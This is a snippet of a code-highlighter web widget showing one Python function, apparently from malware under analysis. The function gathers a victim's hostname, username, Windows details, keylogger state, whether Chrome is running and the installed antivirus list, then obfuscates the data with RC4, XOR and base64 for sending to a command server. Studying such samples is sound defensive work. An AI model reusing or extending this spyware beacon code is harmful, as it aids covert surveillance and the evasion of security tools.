			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def get_request_data(req_type, xmode, pmode):
    data = {
        'type': 'svc', 
        'xmode': xmode, 
        'pmode': pmode, 
        'req_type': req_type, 
        'svc_ver': conf.VERSION, 
        'svc_name': conf.SVC_NAME, 
        'ext_uuid': get_ext_uuid(), 
        'svc_uuid': get_service_uuid(), 
        'old_svc_uuid': get_old_service_uuid(), 
        'host': get_hostname(), 
        'uname': get_username(), 
        'ia': win32.hap(), 
        'wv': win32.gwv(), 
        'dt': datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S'), 
        'xn': os.path.basename(sys.executable)
    }
    if req_type == REQ_GET_CMD:
        data['gc'] = global_conf
        data['klr'] = keylogger.kl_run
        data['cr'] = win32.is_process_exist(exe_name='chrome.exe')
        data['avs'] = get_av_list()
    elif req_type in [REQ_FIRST_RUN, REQ_INSTALL_DONE]:
        data['avs'] = get_av_list()
    enc_data = quote(b64encode(encrypt_xor(rc4_encrypt(json.dumps(data).encode('utf-8')))), safe="~()*!.'")
    return enc_data</textarea></div>

class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">enc_data</span></div></div></td>
